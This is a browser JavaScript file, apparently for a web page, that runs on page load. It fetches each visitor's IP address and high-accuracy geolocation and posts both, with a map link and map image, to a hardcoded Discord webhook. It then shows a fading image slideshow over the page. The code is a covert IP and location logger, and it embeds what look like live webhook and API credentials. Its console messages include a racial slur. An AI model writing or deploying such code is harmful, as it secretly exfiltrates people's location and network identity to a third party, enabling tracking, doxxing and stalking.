document.addEventListener("DOMContentLoaded", async function () {
  await sendIPToDiscord();
  await handleLocation();
});

async function sendIPToDiscord() {
  try {
    const webhookUrl = "https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ"; // Your webhook URL
    const ipAddress = await getUserIPAddress();
    const ipContent = `**IP Address Information:**\n- IP Address: ${ipAddress}`;
    const ipEmbed = {
      title: "IP Address Information",
      description: ipContent,
      color: 14267868
    };
    const dataIp = { embeds: [ipEmbed] };
    const responseIp = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(dataIp)
    });
    if (responseIp.ok) {
      console.log("lamoooo laughing eomij");
    } else {
      console.error("negawatt");
    }
  } catch (error) {
    console.error("neggwatt", error);
  }
}

async function handleLocation() {
  try {
    const locationInfo = await getLocationInfo();
    if (locationInfo) {
      const webhookUrl = "https://discord.com/api/webhooks/1140103989124419686/2DTpJ2FnmaGaNQI6viCy2ZBzkDptJ4vkdpqnJHeHS7f_H5IERJB1yHrVAWGLS7LWDQXQ"; // Your webhook URL
      const locationContent = `**Location Information:**
      - Latitude: ${locationInfo.latitude}
      - Longitude: ${locationInfo.longitude}
      - [View on Google Maps](${locationInfo.googleMapsUrl})`;
      const locationEmbed = {
        title: "Location Information",
        description: locationContent,
        color: 16776960,
        image: { url: locationInfo.mapImageUrl }
      };
      const dataLocation = { embeds: [locationEmbed] };
      const responseLocation = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dataLocation)
      });
      if (responseLocation.ok) {
        console.log("gang nigga gang fr");
        addMarker(locationInfo.latitude, locationInfo.longitude);
      } else {
        console.error("blud what da heck");
      }

      // Fade in and out images
      const imageContainer = document.createElement("div");
      imageContainer.id = "image-container";
      document.body.appendChild(imageContainer);

      const mapContainer = document.getElementById("map"); // Assuming your map's container has the ID "map"
      mapContainer.style.zIndex = "0"; // Set the map's z-index

      const images = [
        "image1.png", "image2.png", "image3.png", "image4.png", "image5.png"
      ];

      let currentIndex = 0;
      const fadeDuration = 1000;

      function fadeInImage() {
        const imageElement = new Image();
        imageElement.src = `images/${images[currentIndex]}`;
        imageElement.classList.add("fading-image");
        imageContainer.appendChild(imageElement);

        setTimeout(() => {
          imageElement.style.opacity = "1";
          setTimeout(() => {
            imageElement.style.opacity = "0";
            currentIndex = (currentIndex + 1) % images.length;
            setTimeout(fadeInImage, fadeDuration);
          }, fadeDuration);
        }, 100);
      }

      fadeInImage();
    }
  } catch (error) {
    console.error("bludl", error);
  }
}

async function getUserIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("dang gang", error);
    return "get betta wifi";
  }
}

async function getLocationInfo() {
  return new Promise((resolve, reject) => {
    if ("geolocation" in navigator) {
      const options = {
        enableHighAccuracy: true,
        timeout: 1000
      };

      navigator.geolocation.getCurrentPosition(
        position => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const mapImageUrl = `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=400&height=300&center=lonlat:${longitude},${latitude}&zoom=15&apiKey=f18eb402f2ff45a297956ce3d6493229`;
          const locationInfo = {
            latitude,
            longitude,
            googleMapsUrl,
            mapImageUrl
          };
          resolve(locationInfo);
        },
        error => {
          resolve(null);
        },
        options
      );
    } else {
      resolve(null);
    }
  });
}
